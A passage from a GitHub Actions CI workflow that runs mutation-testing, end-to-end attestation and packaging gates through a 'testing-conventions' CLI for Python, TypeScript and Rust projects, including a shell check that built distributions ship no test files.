          BASE: ${{ inputs.base }}
          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}
        run: ${CLI_COMMAND:-npm --prefix "$RUNNER_TEMP" exec --yes -- "testing-conventions${VERSION:+@$VERSION}"} unit coverage --language "$LANGUAGE" --base "$BASE" --config "$CONFIG" "$SCAN_PATH"

  mutation:
    name: Unit mutation — changed lines (${{ matrix.language }})
    needs: detect
    # `mutation_languages` is a newer detect output, so the matrix falls back to
    # `coverage_languages` (the identical set) until `@v0` advances to a detect that emits it.
    if: ${{ github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '"mutation"')) && (needs.detect.outputs.mutation_languages || needs.detect.outputs.coverage_languages) != '[]' }}
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        language: ${{ fromJSON(needs.detect.outputs.mutation_languages || needs.detect.outputs.coverage_languages) }}
    steps:
      - uses: actions/checkout@v6
        with:
          # `--base` diffs `<base>...HEAD`, so the base ref must be reachable.
          fetch-depth: 0
      - name: Download the CLI built from HEAD (hermetic)
        if: needs.detect.outputs.cli_command != ''
        uses: ./.github/actions/download-hermetic-cli
      # cargo must be on PATH first: a maturin/PyO3 build triggered by `uv sync` needs it.
      - if: (inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') && matrix.language != 'rust'
        uses: dtolnay/rust-toolchain@stable
      - if: inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true'
        name: Cache the Rust build (cargo registry + target)
        uses: actions/cache@v4
        with:
          path: |
            ~/.cargo/registry
            ~/.cargo/git
            ${{ needs.detect.outputs.cargo_target_dir || format('{0}/target', needs.detect.outputs.package_root) }}
          key: rust-toolchain-build-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}
          restore-keys: |
            rust-toolchain-build-${{ runner.os }}-
      - if: matrix.language == 'python'
        uses: astral-sh/setup-uv@v7
        with:
          enable-cache: true
      - if: matrix.language == 'python'
        name: Provision the Python suite environment (uv)
        working-directory: ${{ needs.detect.outputs.package_root }}
        env:
          PYTHON_ENV: ${{ needs.detect.outputs.python_env || 'pip' }}
        run: |
          set -euo pipefail
          if [ "$PYTHON_ENV" = "uv" ]; then uv sync; else uv venv; fi
          if compgen -G "$GITHUB_WORKSPACE/hermetic-cli/*.whl" > /dev/null; then uv pip install pytest "$GITHUB_WORKSPACE"/hermetic-cli/*.whl; else uv pip install pytest testing-conventions; fi
          echo "$PWD/.venv/bin" >> "$GITHUB_PATH"
      - if: matrix.language == 'typescript' && (needs.detect.outputs.ts_package_manager || 'pnpm') == 'pnpm'
        uses: pnpm/action-setup@v5
        with:
          version: ${{ needs.detect.outputs.ts_pnpm_version || '>=11' }}
      - uses: actions/setup-node@v6
        with:
          node-version: 24
      - if: matrix.language == 'typescript'
        name: Install project dependencies
        working-directory: ${{ needs.detect.outputs.package_root }}
        env:
          PM: ${{ needs.detect.outputs.ts_package_manager || 'pnpm' }}
        run: |
          set -euo pipefail
          if [ "$PM" = "pnpm" ]; then pnpm install --frozen-lockfile; else npm ci; fi
      # The CLI installs cargo-mutants itself on first use; caching that dir reuses the build.
      - if: matrix.language == 'rust'
        uses: dtolnay/rust-toolchain@stable
      - if: matrix.language == 'rust'
        name: Cache the provisioned cargo-mutants
        uses: actions/cache@v4
        with:
          path: ~/.cache/testing-conventions
          key: cargo-mutants-provision-${{ runner.os }}
      - if: needs.detect.outputs.build_command != ''
        name: Run the build step (build_command)
        working-directory: ${{ needs.detect.outputs.package_root }}
        env:
          BUILD_COMMAND: ${{ needs.detect.outputs.build_command }}
        run: |
          set -euo pipefail
          eval "$BUILD_COMMAND"
      - name: Check mutation on the lines changed vs ${{ inputs.base }}
        env:
          LANGUAGE: ${{ matrix.language }}
          SCAN_PATH: ${{ inputs.source }}
          VERSION: ${{ inputs.version }}
          CONFIG: ${{ needs.detect.outputs.config || inputs.config }}
          BASE: ${{ inputs.base }}
          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}
          # `$TS_MUTATION_ADAPTER_ARGS` is deliberately unquoted: empty on the published path,
          # word-split into flag and path on the hermetic one.
          TS_MUTATION_ADAPTER_ARGS: ${{ needs.detect.outputs.ts_mutation_adapter_args }}
        run: ${CLI_COMMAND:-npm --prefix "$RUNNER_TEMP" exec --yes -- "testing-conventions${VERSION:+@$VERSION}"} unit mutation --language "$LANGUAGE" --base "$BASE" --config "$CONFIG" "$SCAN_PATH" $TS_MUTATION_ADAPTER_ARGS

  e2e-verify:
    name: E2E attestation freshness (e2e verify)
    needs: detect
    if: ${{ github.event_name == 'pull_request' && (inputs.gates == '' || contains(inputs.gates, '"e2e-verify"')) && (inputs.run_e2e || needs.detect.outputs.e2e_attestation == 'true') }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
        with:
          # `--base` diffs `<base>..HEAD`, so full history is needed and `inputs.base` must resolve.
          # Check out the PR's head commit, not the ephemeral merge commit, which an attestation
          # can never name — it is rebuilt on every push.
          fetch-depth: 0
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: actions/setup-node@v6
        with:
          node-version: 24
      - name: Download the CLI built from HEAD (hermetic)
        if: needs.detect.outputs.cli_command != ''
        uses: ./.github/actions/download-hermetic-cli
      - name: Verify the e2e attestation is current
        env:
          VERSION: ${{ inputs.version }}
          PACKAGE_ROOT: ${{ needs.detect.outputs.package_root }}
          SCAN_PATH: ${{ inputs.source }}
          BASE: ${{ inputs.base }}
          EXTRA_SCOPE: ${{ needs.detect.outputs.e2e_extra_scope }}
          EXCLUDE: ${{ needs.detect.outputs.e2e_exclude }}
          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}
        # `$EXTRA_SCOPE` / `$EXCLUDE` are deliberately unquoted: empty expands to nothing, and a
        # rendered value word-splits into the repeated flags.
        run: ${CLI_COMMAND:-npm --prefix "$RUNNER_TEMP" exec --yes -- "testing-conventions${VERSION:+@$VERSION}"} e2e verify "$PACKAGE_ROOT" --scope "$SCAN_PATH" --base "$BASE" $EXTRA_SCOPE $EXCLUDE

  packaging:
    name: Packaging (no test files in the built artifact)
    needs: detect
    if: ${{ (inputs.gates == '' || contains(inputs.gates, '"packaging"')) && (inputs.packaging_artifact != '' || needs.detect.outputs.packaging_build != '' || needs.detect.outputs.packaging_dist == 'true') }}
    runs-on: ubuntu-latest
    steps:
      # Checkout must precede the artifact download: actions/checkout deletes the workspace's
      # existing contents before initializing, so downloading first would wipe the artifact.
      - name: Check out the repository to build/inspect its distribution, or just to resolve the hermetic-cli download action
        if: inputs.packaging_artifact == '' || needs.detect.outputs.cli_command != ''
        uses: actions/checkout@v6
      - name: Download the uploaded distributions
        if: inputs.packaging_artifact != ''
        uses: actions/download-artifact@v8
        with:
          name: ${{ inputs.packaging_artifact }}
          path: _packaging_artifact
      - name: Download the CLI built from HEAD (hermetic)
        if: needs.detect.outputs.cli_command != ''
        uses: ./.github/actions/download-hermetic-cli
      # cargo must be on PATH first: `cargo package` needs it, and `uv build`/`prepack` may compile a Rust core.
      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' && (needs.detect.outputs.packaging_language == 'rust' || inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') }}
        uses: dtolnay/rust-toolchain@stable
      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' && (needs.detect.outputs.packaging_language == 'rust' || inputs.rust_toolchain || needs.detect.outputs.provision_rust == 'true') }}
        name: Cache the Rust build (cargo registry + target)
        uses: actions/cache@v4
        with:
          path: |
            ~/.cargo/registry
            ~/.cargo/git
            ${{ needs.detect.outputs.cargo_target_dir || format('{0}/target', needs.detect.outputs.package_root) }}
          key: rust-toolchain-build-${{ runner.os }}-${{ hashFiles('**/Cargo.lock') }}
          restore-keys: |
            rust-toolchain-build-${{ runner.os }}-
      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_language == 'python' }}
        uses: astral-sh/setup-uv@v7
        with:
          enable-cache: true
      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_language == 'typescript' && (needs.detect.outputs.ts_package_manager || 'pnpm') == 'pnpm' }}
        uses: pnpm/action-setup@v5
        with:
          version: ${{ needs.detect.outputs.ts_pnpm_version || '>=11' }}
      - uses: actions/setup-node@v6
        with:
          node-version: 24
      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' && needs.detect.outputs.packaging_language == 'typescript' }}
        name: Install project dependencies
        working-directory: ${{ needs.detect.outputs.package_root }}
        env:
          PM: ${{ needs.detect.outputs.ts_package_manager || 'pnpm' }}
        run: |
          set -euo pipefail
          if [ "$PM" = "pnpm" ]; then pnpm install --frozen-lockfile; else npm ci; fi
      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' && needs.detect.outputs.build_command != '' }}
        name: Run the build step (build_command)
        working-directory: ${{ needs.detect.outputs.package_root }}
        env:
          BUILD_COMMAND: ${{ needs.detect.outputs.build_command }}
        run: |
          set -euo pipefail
          eval "$BUILD_COMMAND"
      - if: ${{ inputs.packaging_artifact == '' && needs.detect.outputs.packaging_build != '' }}
        name: Build the distribution (packaging_build)
        working-directory: ${{ needs.detect.outputs.package_root }}
        env:
          PACKAGING_BUILD: ${{ needs.detect.outputs.packaging_build }}
        run: |
          set -euo pipefail
          eval "$PACKAGING_BUILD"
      - name: Check the built distributions ship no test files
        env:
          VERSION: ${{ inputs.version }}
          PACKAGING_ARTIFACT: ${{ inputs.packaging_artifact }}
          PACKAGE_ROOT: ${{ needs.detect.outputs.package_root }}
          CLI_COMMAND: ${{ needs.detect.outputs.cli_command }}
        run: |
          set -euo pipefail
          # nullglob: an unmatched glob expands to nothing, not the literal; globstar: `**` recurses.
          shopt -s nullglob globstar
          pkg="${PACKAGE_ROOT:-.}"
          if [ -n "$PACKAGING_ARTIFACT" ]; then dist_root=_packaging_artifact; crate_root=_packaging_artifact; else dist_root="$pkg/dist"; crate_root="$pkg/target/package"; fi
          checked=0
          check () {
            local lang="$1"; shift
            for dist in "$@"; do
              echo "::group::packaging --language $lang $dist"
              ${CLI_COMMAND:-npm --prefix "$RUNNER_TEMP" exec --yes -- "testing-conventions${VERSION:+@$VERSION}"} packaging "$dist" --language "$lang"
              echo "::endgroup::"
              checked=$((checked + 1))
            done
          }
          check python "$dist_root"/**/*.whl "$dist_root"/**/*.tar.gz
          check typescript "$dist_root"/**/*.tgz
          check rust "$crate_root"/**/*.crate
          if [ "$checked" -eq 0 ]; then
            echo "::error::no recognized built distribution (.whl / .tar.gz / .tgz / .crate) found in '$dist_root' or '$crate_root'"
            exit 1
          fi
          echo "checked $checked built distribution(s); no test files shipped"
